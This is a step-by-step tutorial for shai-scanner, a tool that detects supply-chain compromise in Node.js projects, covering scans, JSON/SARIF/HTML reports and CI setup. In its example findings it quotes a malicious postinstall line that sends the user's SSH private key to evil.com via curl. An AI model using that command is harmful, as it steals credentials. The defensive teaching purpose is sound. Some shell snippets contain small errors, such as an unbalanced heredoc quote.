# Shai-Scanner v4.6.0 Interactive Tutorial

> **Duration:** 30 minutes | **Level:** Beginner to Intermediate | **Last Updated:** January 2025

Welcome to the **shai-scanner interactive tutorial**! 🐶 This hands-on guide will walk you through setting up and using shai-scanner to detect supply-chain indicators in your Node.js projects.

**🎯 Learning Objectives:**
- Install and verify shai-scanner v4.6.0
- Run your first security scan
- Interpret scan results and severity levels
- Generate JSON, SARIF, and HTML reports
- Set up automated scanning with GitHub Actions
- Import custom IOCs for organization-specific threats
- Use multi-project scanning for organization-wide scans
- Explore the interactive TUI mode

**⏱️ Time Tracking:**
| Section | Est. Time | Actual Time |
|---------|-----------|-------------|
| 1. Introduction | 2 min | ___ min |
| 2. Environment Setup | 5 min | ___ min |
| 3. First Scan | 10 min | ___ min |
| 4. Understanding Output | 5 min | ___ min |
| 5. Advanced Features | 5 min | ___ min |
| 6. CI/CD Integration | 5 min | ___ min |
| 7. Next Steps | 3 min | ___ min |
| **Total** | **30 min** | ___ min |

**Prerequisites:**
- Node.js 18+ installed ([download here](https://nodejs.org/))
- Terminal/command line access
- A text editor (VS Code, Sublime, or whatever you fancy)
- Basic familiarity with npm/Node.js projects

---

## Table of Contents

1. [Introduction](#1-introduction-2-minutes)
2. [Environment Setup](#2-environment-setup-5-minutes)
3. [First Scan](#3-first-scan-10-minutes)
4. [Understanding Output](#4-understanding-output-5-minutes)
5. [Advanced Features](#5-advanced-features-5-minutes)
6. [CI/CD Integration](#6-cicd-integration-5-minutes)
7. [Next Steps](#7-next-steps-3-minutes)

---

## 1. Introduction (2 minutes)

### What is shai-scanner?

shai-scanner is a **dependency-light security scanner** designed to detect supply-chain indicators of compromise (IOCs) in Node.js projects. It's built for the Shai-Hulud threat landscape—those nasty npm packages that try to steal your secrets, crypto-miners hiding in dependencies, and other supply-chain attacks.

### Key Features We'll Cover:

| Feature | Description |
|---------|-------------|
| **Zero Runtime Dependencies** | No bloated node_modules, no install risk |
| **Offline Capability** | Scan without internet after initial setup |
| **Multi-project Scanning** | Scan multiple repos from one command |
| **Live Advisories** | Real-time CVE/GHSA/malware checks |
| **Multiple Output Formats** | JSON, SARIF, HTML reports |
| **Custom IOCs** | Import your organization's threat intel |
| **Interactive TUI** | Menu-driven terminal interface |
| **SBOM Generation** | SPDX 2.3 compliance reports |

### Why This Matters

In 2024-2025, supply-chain attacks increased by **742%**. One malicious package can:
- Steal environment variables and secrets
- Deploy crypto miners
- Establish backdoors
- Exfiltrate source code

shai-scanner helps you catch these threats **before** they reach production.

---

## 2. Environment Setup (5 minutes)

### Step 2.1: Verify Node.js Installation

First, let's make sure you have Node.js 18+ installed:

```bash
node --version
# Expected output: v18.x.x or higher (e.g., v20.11.0)
```

<details>
<summary>⚠️ Troubleshooting: "command not found: node"</summary>

1. Install Node.js from [nodejs.org](https://nodejs.org/)
2. Restart your terminal
3. Verify with `node --version`

On macOS with Homebrew:
```bash
brew install node
```

On Ubuntu/Debian:
```bash
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs
```
</details>

### Step 2.2: Install shai-scanner

You have three installation options. Pick whichever suits your workflow:

#### Option A: Global Install (Recommended)

```bash
# Clone or download shai-scanner v4.6.0
git clone https://github.com/your-org/shai-scanner.git
cd shai-scanner

# Install globally
npm install -g .
```

#### Option B: Run Directly from Source

```bash
# After downloading/shoning
cd shai-scanner-4.6.0
node src/cli.js --help
```

#### Option C: Use npx (No Install Required)

```bash
npx shai-scanner --help
```

### Step 2.3: Verify Installation

Run this command to confirm shai-scanner v4.6.0 is installed:

```bash
shai-scanner --version
# Expected output: 4.6.0
```

If you're running from source:
```bash
node src/cli.js --version
# Expected output: 4.6.0
```

**💡 Pro Tip:** If you're in an environment that doesn't support ANSI colors (like some CI systems or pipes), use:
```bash
shai-scanner --scan . --no-color
# This disables colored output for better compatibility
```

### 🎯 Checkpoint 1: Installation Verification

**⏱️ Time Check:** Should be completed by minute 7

**Success Criteria:** 
- [ ] `shai-scanner --version` returns `4.6.0`
- [ ] `shai-scanner --help` shows usage information
- [ ] No error messages during installation

```bash
# Run these commands and verify the output
shai-scanner --version
# Expected output: 4.6.0

shai-scanner --help
# Expected output: Shows usage information and available commands
```

**Validation Commands:**
```bash
# Complete this checklist
echo "Checking shai-scanner installation..."
shai-scanner --version && echo "✅ Version check passed" || echo "❌ Version check failed"
shai-scanner --help > /dev/null && echo "✅ Help command works" || echo "❌ Help command failed"
```

✅ **Checkpoint Passed?** If yes, continue to Section 3.
❌ **Still having issues?** See [Troubleshooting Guide](#troubleshooting)

---

## 3. First Scan (10 minutes)

### Step 3.1: Set Up a Test Project

Let's create a quick test project to scan. Don't worry—this is safe and educational!

```bash
# Create a test directory
mkdir ~/shai-scanner-test
cd ~/shai-scanner-test

# Create a package.json with some dependencies
cat > package.json << 'EOF'
{
  "name": "my-test-project",
  "version": "1.0.0",
  "description": "Test project for shai-scanner tutorial",
  "dependencies": {
    "express": "^4.18.2",
    "lodash": "^4.17.21"
  },
  "devDependencies": {
    "jest": "^29.7.0"
  }
}
EOF
```

### Step 3.2: Run Your First Scan

Now let's scan the current directory:

```bash
shai-scanner --scan .
```

**What you'll see:**
```
Scanning . for supply-chain indicators...

📦 Scanning node_modules...
📄 Scanning package-lock.json...
🔍 Checking package.json dependencies...
📁 Scanning for malicious files...

═══════════════════════════════════════════════
✅ Scan Complete
═══════════════════════════════════════════════

📊 Results Summary:
   • Packages scanned: 15
   • Lockfiles checked: 1
   • Manifests analyzed: 1
   • Findings: 0

🎯 Status: Clean
```

### Step 3.3: Scan with More Detail

Let's try scanning with verbose output to see everything shai-scanner checks:

```bash
shai-scanner --scan . --json
```

**Expected JSON output (simplified):**
```json
{
  "version": "4.6.0",
  "scanPath": ".",
  "timestamp": "2025-01-15T10:30:00.000Z",
  "stats": {
    "packagesScanned": 15,
    "lockfilesChecked": 1,
    "manifestsAnalyzed": 1,
    "findingsCount": 0
  },
  "findings": [],
  "inventory": {
    "packages": ["express@4.18.2", "lodash@4.17.21", "jest@29.7.0"],
    "lockfiles": ["package-lock.json"]
  }
}
```

### Step 3.4: Test Against a Known Malicious Package

Now let's see what happens when shai-scanner detects a threat. We'll check a known malicious package:

```bash
# Check a specific known-malicious package (from tutorial safety list)
shai-scanner --check intercom-client@7.0.4
```

**Expected output:**
```
Checking intercom-client@7.0.4...

🚨 MALICIOUS PACKAGE DETECTED
═══════════════════════════════════════════════

Package: intercom-client@7.0.4
Severity: CRITICAL
Type: Malicious Package (Mini Shai-Hulud)
Status: Known IOC - DO NOT INSTALL

This package is part of the Mini Shai-Hulud supply-chain attack
campaign. Installing this package will execute malicious code.

Action Required:
  1. Remove from package.json
  2. Delete from node_modules if installed
  3. Regenerate lockfile
  4. Rotate any exposed credentials

For more information: https://advisories.example.com/shai-hulud
```

### Step 3.5: Scan a Specific Directory

Let's scan just the lockfiles (safer—no need to install dependencies):

```bash
# First, install dependencies (for demonstration)
npm install --ignore-scripts

# Now scan lockfiles only
shai-scanner --lockfiles-only --scan .
```

**Expected output:**
```
Scanning . for lockfile indicators only...

📄 Scanning package-lock.json...

═══════════════════════════════════════════════
✅ Lockfile Scan Complete
═══════════════════════════════════════════════

📊 Results Summary:
   • Lockfiles checked: 1
   • Packages in lockfile: 47
   • Findings: 0

🎯 Status: Clean
```

### 🎯 Checkpoint 2: First Scan Complete

**⏱️ Time Check:** Should be completed by minute 17

**Success Criteria:** 
- [ ] `shai-scanner --scan .` completes without errors
- [ ] `shai-scanner --check intercom-client@7.0.4` shows detection
- [ ] `shai-scanner --lockfiles-only --scan .` works
- [ ] You understand the basic scan output

```bash
# Run these commands and verify they complete successfully
shai-scanner --scan .
# Expected: Scan completes, shows findings summary

shai-scanner --check intercom-client@7.0.4
# Expected: Shows malicious package detection

shai-scanner --lockfiles-only --scan .
# Expected: Scans only lockfiles, completes quickly
```

**Validation Script:**
```bash
echo "Testing first scan..."
shai-scanner --scan . > /dev/null 2>&1 && echo "✅ Basic scan works" || echo "❌ Basic scan failed"
shai-scanner --check intercom-client@7.0.4 2>&1 | grep -q "MALICIOUS" && echo "✅ IOC detection works" || echo "❌ IOC detection failed"
shai-scanner --lockfiles-only --scan . > /dev/null 2>&1 && echo "✅ Lockfile scan works" || echo "❌ Lockfile scan failed"
```

✅ **Checkpoint Passed?** Continue to Section 4.
❌ **Encountered errors?** Check the [Troubleshooting Guide](#troubleshooting)

---

## 4. Understanding Output (5 minutes)

### Step 4.1: Severity Levels Explained

shai-scanner uses a color-coded severity system:

| Severity | Color | Meaning | Action Required |
|----------|-------|---------|-----------------|
| **CRITICAL** | 🔴 Red | Known malicious package/version | **Immediate removal** - Stop all builds |
| **HIGH** | 🟠 Orange | Strong IOC match | **Urgent review** - Audit affected code |
| **MEDIUM** | 🟡 Yellow | Suspicious pattern | **Investigate** - Verify legitimacy |
| **LOW** | 🔵 Blue | Informational finding | **Monitor** - No immediate action |
| **INFO** | ⚪ Gray | Contextual information | **Awareness** - For reference |

### Step 4.2: Finding Types

Let's explore different finding types:

```bash
# Search the database for known threats
shai-scanner --search-db "express"
```

**Example output:**
```
Searching IOC database for "express"...

📦 Package Findings (0):
   No malicious packages matching "express" found.

📋 Version Findings (2):
   1. express@4.17.1 - MEDIUM - Deprecated version with known vulnerabilities
   2. express@4.16.0 - LOW - Outdated, consider upgrading

📁 Artifact Findings (1):
   1. .env.example - INFO - Common configuration file (not a threat)
```

### Step 4.3: Interpreting Scan Results

Let's examine a more detailed scan result:

```bash
shai-scanner --scan . --json > scan-results.json
cat scan-results.json | head -50
```

**Key fields to understand:**

```json
{
  "findings": [
    {
      "id": "FINDING-001",
      "type": "package",           // Finding type: package, lockfile, manifest, artifact
      "severity": "high",          // Severity level
      "package": "suspicious-pkg", // Affected package
      "version": "1.2.3",          // Specific version
      "description": "Known supply-chain indicator",
      "source": "datadog-ioc",     // Where the finding came from
      "references": [...],         // Links to advisories
      "remediation": "..."         // What to do about it
    }
  ]
}
```

### Step 4.4: Common Finding Patterns

**Pattern 1: Package name squatting**
```
📦 @cap-js/sqlite@2.2.2
   Type: Package Name Squatting
   Severity: CRITICAL
   Description: Impersonates legitimate @cap-js packages
   Note: Legitimate package is @cap-js/sqlite but different maintainer
```

**Pattern 2: Malicious lifecycle script**
```
📜 package.json lifecycle script detected
   Type: Manifest Finding
   Severity: HIGH
   Description: postinstall script executes unknown code
   Location: package.json#scripts.postinstall
   Script: "node setup.js && curl https://evil.com/exfil?data=$(cat ~/.ssh/id_rsa)"
```

**Pattern 3: Suspicious file artifact**
```
📁 setup_bun.js
   Type: Artifact Finding
   Severity: HIGH
   Description: Known malicious installer file
   Location: ./node_modules/.cache/setup_bun.js
   Note: Associated with Bun supply-chain attack
```

### 🎯 Checkpoint 3: Output Interpretation

**⏱️ Time Check:** Should be completed by minute 22

**Success Criteria:** 
- [ ] You can explain all 5 severity levels (CRITICAL, HIGH, MEDIUM, LOW, INFO)
- [ ] You can identify at least 3 different finding types
- [ ] You understand how to read a JSON finding object
- [ ] You can interpret scan output correctly

```bash
# Test your understanding
shai-scanner --search-db "intercom"
# Can you identify the severity and type of findings?

# Quiz yourself:
# 1. What does CRITICAL severity mean?
# 2. What's the difference between package and artifact findings?
# 3. How do you read the 'source' field in a finding?
```

**Knowledge Check:**
```bash
# Run this to see example findings
shai-scanner --search-db ""
# Study the output structure and severity levels
```

✅ **Checkpoint Passed?** Continue to Section 5.
❌ **Need more help?** Review the [API Documentation](../docs/API.md)

---

## 5. Advanced Features (5 minutes)

### Step 5.1: JSON Output for Automation

JSON output is perfect for scripting and automation:

```bash
# Generate JSON report
shai-scanner --scan . --json > shai-scan.json

# Pretty-print the JSON
cat shai-scan.json | python3 -m json.tool

# Or use jq (if installed)
cat shai-scan.json | jq '.findings[] | select(.severity == "critical")'
```

**Pro tip:** Use JSON output with tools like `jq` for custom filtering:
```bash
# Show only high/critical findings
cat shai-scan.json | jq '.findings[] | select(.severity == "high" or .severity == "critical")'
```

### Step 5.2: SARIF Output for GitHub Code Scanning

SARIF (Static Analysis Results Interchange Format) integrates with GitHub's code scanning:

```bash
# Generate SARIF report
shai-scanner --scan . --sarif --output shai-scanner.sarif

# Verify the SARIF file
cat shai-scanner.sarif | jq '.runs[0].results[] | {ruleId, level, message}'
```

**SARIF structure:**
```json
{
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
  "version": "2.1.0",
  "runs": [{
    "tool": {
      "driver": {
        "name": "shai-scanner",
        "version": "4.6.0"
      }
    },
    "results": [...]
  }]
}
```

### Step 5.3: HTML Reports for Presentations

Generate beautiful, interactive reports for stakeholders:

```bash
# Generate HTML report
shai-scanner --scan . --html -o security-report.html

# Open in browser (macOS)
open security-report.html

# Open in browser (Linux)
xdg-open security-report.html
```

**HTML Report Features:**
- 📊 Visual severity charts (bar charts, donut charts)
- 🔍 Search and filter capabilities
- 📱 Responsive design (works on mobile)
- 🖨️ Print-friendly layout
- 📁 Self-contained (no external dependencies)

### Step 5.4: Custom IOCs for Your Organization

Import your own threat intelligence:

```bash
# Create a custom IOC CSV file
cat > my-org-iocs.csv << 'EOF'
package_name,package_version
@myorg/internal-lib,1.0.0
@myorg/legacy-utils,2.3.4
suspicious-logger,0.1.0
EOF

# Import and scan
shai-scanner --import-csv my-org-iocs.csv --scan .

# Or combine with existing IOCs
shai-scanner --import-csv my-org-iocs.csv --scan . --json
```

**CSV Format Options:**
```csv
# Simple format (package + version)
package_name,package_version
malicious-pkg,1.0.0

# Extended format (with vendors)
package_name,package_versions,vendors
internal-tool,"1.0.0,1.0.1,1.1.0",internal
```

### Step 5.5: SBOM Generation (Software Bill of Materials)

Generate compliance-ready SBOMs:

```bash
# Generate JSON SBOM
shai-scanner --scan . --sbom -o bill-of-materials.spdx.json

# Generate tag-value SBOM
shai-scanner --scan . --sbom-tag-value -o bill-of-materials.spdx

# Combine with scan results
shai-scanner --scan . --sbom --json -o full-report.json
```

**SBOM compliance:**
- ✅ SPDX 2.3 specification
- ✅ NTIA minimum elements
- ✅ EU Cyber Resilience Act (CRA)

### Step 5.6: Error Handling and Real-World Scenarios

**Scenario 1: Network connectivity issues**
```bash
# If you're behind a corporate firewall
shai-scanner --scan . --offline --no-auto-update
# This skips network calls and uses cached data only

# If you need live advisories but have proxy issues
HTTPS_PROXY=http://proxy.company.com:8080 shai-scanner --scan . --live
```

**Scenario 2: Large repository performance**
```bash
# Scan depth limited (faster for large repos)
shai-scanner --scan . --max-depth 5

# Lockfiles only (fastest, no node_modules scanning)
shai-scanner --scan . --lockfiles-only

# Skip specific components
shai-scanner --scan . --no-node-modules --no-manifests
```

**Scenario 3: CI/CD failure scenarios**
```bash
# Test what happens when findings are detected
shai-scanner --scan . --fail-on-advisory
# Exit code will be 1 if findings detected

# Capture exit code for custom handling
shai-scanner --scan . --fail-on-advisory --json > results.json
EXIT_CODE=$?

if [ $EXIT_CODE -eq 1 ]; then
  echo "🚨 Security findings detected!"
  cat results.json | jq '.findings[] | select(.severity == "critical")'
  # Send alert, create ticket, etc.
elif [ $EXIT_CODE -eq 0 ]; then
  echo "✅ No security issues found"
else
  echo "⚠️ Scan error occurred (exit code: $EXIT_CODE)"
fi
```

**Scenario 4: Custom IOC validation**
```bash
# Validate your CSV format before importing
cat > valid-iocs.csv << 'EOF'
package_name,package_version
@myorg/compromised-pkg,1.2.3
malicious-dep,4.5.6
EOF

# Test import (dry run)
shai-scanner --import-csv valid-iocs.csv --list-db | grep "@myorg/compromised-pkg"
```

### Step 5.7: Interactive TUI Mode

For those who prefer a menu-driven interface, shai-scanner includes a modern Terminal User Interface (TUI):

```bash
# Launch the interactive TUI
shai-scanner --tui

# Or from source
npm run tui
```

**TUI Features:**
- 🎨 **Component-based architecture** - Modern, maintainable UI
- 🔄 **Differential rendering** - Only changed content updates
- 📊 **Visual progress indicators** - See scan progress in real-time
- 🔍 **Interactive findings browser** - Explore results interactively
- ⚙️ **Configuration menu** - Adjust settings visually

**TUI Keyboard Shortcuts:**
| Key | Action |
|-----|--------|
| `↑/↓` | Navigate menu items |
| `Enter` | Select item |
| `Esc` | Go back / Cancel |
| `q` | Quit TUI |
| `?` | Show help |

> 💡 **Note:** The TUI requires a terminal with TTY support. It won't work in non-interactive environments like CI/CD pipelines.

### Step 5.8: Multi-Project Scanning

For organizations with multiple repositories, scan them all at once:

```bash
# Create a project list file
cat > projects.txt << 'EOF
# My organization's projects
/path/to/project-a
/path/to/project-b
/path/to/project-c
EOF

# Scan all projects sequentially
shai-scanner --multi-scan projects.txt

# Scan in parallel for faster results
shai-scanner --multi-scan projects.txt --parallel --concurrency 8

# Output as JSON
shai-scanner --multi-scan projects.txt --json > multi-project-report.json
```

**Project List Features:**
- ✅ Absolute paths: `/home/user/projects/my-app`
- ✅ Relative paths: `./my-app` or `../sibling-project`
- ✅ Glob patterns: `./projects/*/package.json`
- ✅ Comments: Lines starting with `#` or `//`
- ✅ Blank lines: Ignored automatically

**Multi-project output includes:**
- Summary of all projects scanned
- Total findings across all projects
- Per-project breakdown with finding counts
- Aggregated statistics

### 🎯 Checkpoint 4: Advanced Features Mastery

**⏱️ Time Check:** Should be completed by minute 27

**Success Criteria:** 
- [ ] You can generate JSON output and filter with `jq`
- [ ] You can create SARIF reports for GitHub integration
- [ ] You can build HTML reports for presentations
- [ ] You can import custom IOC CSV files
- [ ] You can generate SBOMs for compliance
- [ ] You understand the TUI mode and its features
- [ ] You know how to use multi-project scanning

```bash
# Test all output formats
echo "Testing advanced features..."
shai-scanner --scan . --json > test.json && echo "✅ JSON output works" || echo "❌ JSON failed"
shai-scanner --scan . --sarif --output test.sarif && echo "✅ SARIF output works" || echo "❌ SARIF failed"
shai-scanner --scan . --html -o test.html && echo "✅ HTML output works" || echo "❌ HTML failed"
shai-scanner --scan . --sbom -o test-sbom.json && echo "✅ SBOM generation works" || echo "❌ SBOM failed"

# Verify all files were created
ls -lh test.* test-sbom.json
```

**Advanced Test:**
```bash
# Test custom IOC import
echo "package_name,package_version" > test-iocs.csv
echo "test-malicious-pkg,1.0.0" >> test-iocs.csv
shai-scanner --import-csv test-iocs.csv --scan . && echo "✅ Custom IOC import works" || echo "❌ Custom IOC import failed"

# Test multi-project scanning (create a test project list)
echo "." > test-projects.txt  # Scan current directory as a "project"
shai-scanner --multi-scan test-projects.txt && echo "✅ Multi-project scan works" || echo "❌ Multi-project scan failed"

# Test TUI mode (optional - requires terminal)
if [ -t 0 ]; then  # Check if running in interactive terminal
  echo "✅ TUI mode available (run 'shai-scanner --tui' to launch)"
else
  echo "⚠️ TUI mode requires interactive terminal"
fi
```

✅ **Checkpoint Passed?** Continue to Section 6.
❌ **Need practice?** Try generating reports in different formats and comparing them.

---

## 6. CI/CD Integration (5 minutes)

### Step 6.1: GitHub Actions Workflow

Let's set up automated scanning with GitHub Actions:

```bash
# Generate a pre-configured workflow file
shai-scanner --init-ci > .github/workflows/shai-scanner.yml

# Create the directory if it doesn't exist
mkdir -p .github/workflows

# Copy the generated workflow
shai-scanner --init-ci > .github/workflows/shai-scanner.yml
```

**Generated workflow:**
```yaml
name: Shai-Hulud supply-chain scan

on:
  push:
  pull_request:

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - name: Install shai-scanner
        run: npm install -g shai-scanner
      - name: Scan for supply-chain indicators
        run: shai-scanner --scan . --offline --no-auto-update
```

### Step 6.2: Customizing the Workflow

Let's enhance the workflow with more features:

```yaml
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    # Run weekly on Monday at 9 AM UTC
    - cron: '0 9 * * 1'

jobs:
  security-scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write  # For SARIF upload
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Install shai-scanner
        run: npm install -g shai-scanner
      
      - name: Run supply-chain scan
        run: |
          shai-scanner --scan . \
            --json \
            --sarif \
            --html \
            --output scan-results.json
        continue-on-error: false
      
      - name: Upload SARIF to GitHub Code Scanning
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: shai-scanner.sarif
      
      - name: Upload scan artifacts
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: security-reports
          path: |
            scan-results.json
            shai-scanner.sarif
            security-report.html
          retention-days: 30
```

### Step 6.3: Quality Gates

Add quality gates to fail builds on critical findings:

```bash
# Fail on critical/high severity findings
shai-scanner --scan . --fail-on-advisory --fail-on-warning

# Exit codes:
# 0 = Clean scan
# 1 = Findings detected (critical/high)
# 2 = Scan error
# 3 = Database update failed
# 4 = Invalid arguments
```

**Example quality gate script:**
```bash
#!/bin/bash
# quality-gate.sh

echo "🔍 Running security scan..."

# Run scan with strict settings
shai-scanner --scan . \
  --json \
  --fail-on-advisory \
  --fail-on-warning \
  --offline \
  --no-auto-update

EXIT_CODE=$?

case $EXIT_CODE in
  0)
    echo "✅ Security scan passed!"
    exit 0
    ;;
  1)
    echo "❌ Security scan failed - findings detected!"
    echo "Review the scan results and address critical issues."
    exit 1
    ;;
  2)
    echo "⚠️ Scan error occurred. Check scanner configuration."
    exit 1
    ;;
  *)
    echo "❌ Unexpected error (exit code: $EXIT_CODE)"
    exit 1
    ;;
esac
```

### Step 6.4: Testing the CI Setup

Let's test our CI configuration locally:

```bash
# Create a test CI script
cat > test-ci.sh << 'EOF'
#!/bin/bash
set -e

echo "🧪 Testing CI pipeline locally..."

# Simulate GitHub Actions environment
export CI=true
export GITHUB_ACTIONS=true

# Run scan as CI would
shai-scanner --scan . \
  --json \
  --sarif \
  --offline \
  --no-auto-update \
  --output ci-scan.json

echo "✅ CI test completed successfully!"
EOF

chmod +x test-ci.sh
./test-ci.sh
```

### 🎯 Checkpoint 5: CI/CD Integration Complete

**⏱️ Time Check:** Should be completed by minute 30

**Success Criteria:** 
- [ ] You can generate a GitHub Actions workflow with `--init-ci`
- [ ] You can customize the workflow for your needs
- [ ] You understand quality gates with exit codes
- [ ] You can test CI pipelines locally

```bash
# Verify CI setup
echo "Testing CI/CD integration..."
ls -la .github/workflows/ && echo "✅ Workflow directory exists" || echo "❌ Workflow directory missing"
cat .github/workflows/shai-scanner.yml | grep -q "shai-scanner" && echo "✅ Workflow contains shai-scanner" || echo "❌ Workflow missing shai-scanner"

# Test the workflow locally
if [ -f "./test-ci.sh" ]; then
  ./test-ci.sh && echo "✅ Local CI test passed" || echo "❌ Local CI test failed"
else
  echo "⚠️ test-ci.sh not found, skipping local test"
fi
```

**CI/CD Validation:**
```bash
# Test exit codes
shai-scanner --scan . --fail-on-advisory
echo "Exit code: $?"
# Should return 0 for clean scan, 1 for findings
```

✅ **Checkpoint Passed?** Continue to Section 7.
❌ **GitHub Actions issues?** See the [GitHub Actions Documentation](https://docs.github.com/en/actions)

---

## 7. Next Steps (3 minutes)

### 🎉 Congratulations!

You've completed the shai-scanner interactive tutorial! Here's what you've mastered:

- ✅ Installed and verified shai-scanner v4.6.0
- ✅ Ran your first security scan
- ✅ Interpreted severity levels and finding types
- ✅ Generated JSON, SARIF, and HTML reports
- ✅ Imported custom IOCs
- ✅ Set up GitHub Actions for automated scanning
- ✅ Implemented quality gates

### 📚 Resources for Further Learning

**Documentation:**
- [API Documentation](../docs/API.md) - Full API reference for programmatic usage
- [TUI Usage Guide](../docs/TUI_USAGE_GUIDE.md) - Interactive terminal UI guide
- [Migration Guide](../docs/MIGRATION_GUIDE.md) - Upgrading from older versions
- [Architecture](../ARCHITECTURE.md) - System design and principles

**Community:**
- [GitHub Issues](https://github.com/your-org/shai-scanner/issues) - Bug reports and feature requests
- [Contributing Guide](../CONTRIBUTING.md) - How to contribute to shai-scanner
- [Code of Conduct](../CODE_OF_CONDUCT.md) - Community standards

**Security:**
- [Security Policy](../SECURITY.md) - Reporting vulnerabilities
- [Incident Response](../README.md#recommended-incident-response-when-findings-are-present) - What to do when findings are detected

### 🚀 Advanced Usage

Now that you're comfortable with the basics, explore these advanced features:

```bash
# 1. Multi-project scanning
cat > projects.txt << EOF
./project-a
./project-b
./project-c
EOF
shai-scanner --multi-scan projects.txt --parallel --concurrency 8

# 2. Live advisory queries
shai-scanner --scan . --live --fail-on-advisory

# 3. Comprehensive audit
shai-scanner --scan . --audit --live --json --sarif --html

# 4. SBOM generation for compliance
shai-scanner --scan . --sbom --sbom-tag-value -o compliance-sbom.spdx
```

### 🐛 Troubleshooting

**Common Issues:**

| Problem | Solution |
|---------|----------|
| `command not found: shai-scanner` | Run `npm install -g .` or use `node src/cli.js` |
| `Permission denied` | Use `sudo npm install -g .` or fix npm permissions |
| `Module not found` | Ensure you're in the shai-scanner directory |
| Scan hangs | Try `--offline --no-auto-update` flags |
| No findings shown | Try `--search-db` to verify IOC database |
| `npm ERR! code EACCES` | Fix npm permissions: `mkdir ~/.npm-global && npm config set prefix '~/.npm-global'` |
| `Error: Cannot find module` | Run `npm install` in shai-scanner directory |
| Slow network scans | Use `--offline` mode after initial database download |
| Large repository timeout | Use `--max-depth 5` to limit scan depth |
| SARIF upload fails | Ensure `security-events: write` permission in GitHub Actions |

**Debug Mode:**
```bash
# Enable verbose logging
DEBUG=* shai-scanner --scan . 2>&1 | head -100

# Check specific component
DEBUG=scanner shai-scanner --scan . 2>&1 | tail -50

# Log to file for analysis
shai-scanner --scan . --json > scan-debug.json 2>&1
```

**Network Issues:**
```bash
# Test connectivity to advisory databases
curl -I https://api.osv.dev

# Check if you're in offline mode
shai-scanner --scan . --offline  # Should work without network

# Force database update
shai-scanner --update  # Requires network
```

**Get Help:**
```bash
# Show all available options
shai-scanner --help

# Check scanner version and config
shai-scanner --version
shai-scanner --list-db | head -20

# Report issues
# GitHub: https://github.com/your-org/shai-scanner/issues
```

---

## 🎯 Final Validation

**⏱️ Final Time Check:** You should be at minute 30

**Complete this comprehensive checklist to confirm mastery:**

```bash
echo "=== SHAI-SCANNER TUTORIAL FINAL VALIDATION ==="
echo ""

# 1. Installation check
echo "1. Checking installation..."
VERSION=$(shai-scanner --version)
if [ "$VERSION" = "4.6.0" ]; then
  echo "   ✅ Version: $VERSION (correct)"
else
  echo "   ❌ Version: $VERSION (expected 4.6.0)"
fi

# 2. Basic scan
echo "2. Testing basic scan..."
if shai-scanner --scan . > /dev/null 2>&1; then
  echo "   ✅ Basic scan: PASS"
else
  echo "   ❌ Basic scan: FAIL"
fi

# 3. Output generation
echo "3. Testing output formats..."
shai-scanner --scan . --json > final-test.json 2>/dev/null && echo "   ✅ JSON output: PASS" || echo "   ❌ JSON output: FAIL"
shai-scanner --scan . --sarif --output final-test.sarif 2>/dev/null && echo "   ✅ SARIF output: PASS" || echo "   ❌ SARIF output: FAIL"
shai-scanner --scan . --html -o final-test.html 2>/dev/null && echo "   ✅ HTML output: PASS" || echo "   ❌ HTML output: FAIL"

# 4. IOC detection
echo "4. Testing IOC detection..."
if shai-scanner --check intercom-client@7.0.4 2>&1 | grep -q "MALICIOUS"; then
  echo "   ✅ IOC detection: PASS"
else
  echo "   ❌ IOC detection: FAIL"
fi

# 5. CI workflow
echo "5. Testing CI/CD setup..."
if [ -f ".github/workflows/shai-scanner.yml" ]; then
  echo "   ✅ GitHub Actions workflow: EXISTS"
  if grep -q "shai-scanner" .github/workflows/shai-scanner.yml; then
    echo "   ✅ Workflow contains shai-scanner: YES"
  else
    echo "   ❌ Workflow missing shai-scanner"
  fi
else
  echo "   ❌ GitHub Actions workflow: MISSING"
fi

# 6. Advanced features
echo "6. Testing advanced features..."
shai-scanner --sbom -o final-sbom.json 2>/dev/null && echo "   ✅ SBOM generation: PASS" || echo "   ❌ SBOM generation: FAIL"
shai-scanner --list-db > /dev/null 2>&1 && echo "   ✅ Database listing: PASS" || echo "   ❌ Database listing: FAIL"

# 7. TUI mode check
echo "7. Testing TUI availability..."
if [ -t 0 ]; then
  echo "   ✅ TUI mode: AVAILABLE (run 'shai-scanner --tui' to launch)"
else
  echo "   ⚠️  TUI mode: REQUIRES INTERACTIVE TERMINAL"
fi

echo ""
echo "=== VALIDATION COMPLETE ==="
echo "Review the results above. All items should show ✅ for full mastery."
echo "If any show ❌, review the relevant section in the tutorial."
```

---

## Appendix: Quick Reference

### Essential Commands

```bash
# Basic scanning
shai-scanner --scan .                    # Scan current directory
shai-scanner --lockfiles-only --scan .   # Scan lockfiles only
shai-scanner --check <pkg@version>       # Check specific package

# Output formats
shai-scanner --scan . --json             # JSON output
shai-scanner --scan . --sarif            # SARIF for GitHub
shai-scanner --scan . --html             # Interactive HTML report
shai-scanner --scan . --sbom             # SPDX 2.3 SBOM

# Live queries
shai-scanner --scan . --live             # OSV + GitHub advisories
shai-scanner --scan . --live-osv         # OSV only
shai-scanner --scan . --live-github      # GitHub only

# Multi-project
shai-scanner --multi-scan projects.txt   # Scan multiple projects
shai-scanner --multi-scan projects.txt --parallel  # Parallel scan

# CI/CD
shai-scanner --init-ci                   # Generate GitHub Actions
shai-scanner --scan . --fail-on-advisory # Fail on findings

# Database
shai-scanner --update                    # Update IOC database
shai-scanner --list-db                   # List known IOCs
shai-scanner --search-db "query"         # Search IOCs
```

### Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Clean scan - no findings |
| 1 | Findings detected (with `--fail-on-advisory`) |
| 2 | Scan/runtime error |
| 3 | Database update failed |
| 4 | Invalid arguments |

---

**Tutorial Complete!** 🐶

*Part of [Phase 4: User Onboarding Materials](../PHASE4_USER_ONBOARDING_PLAN.md)*

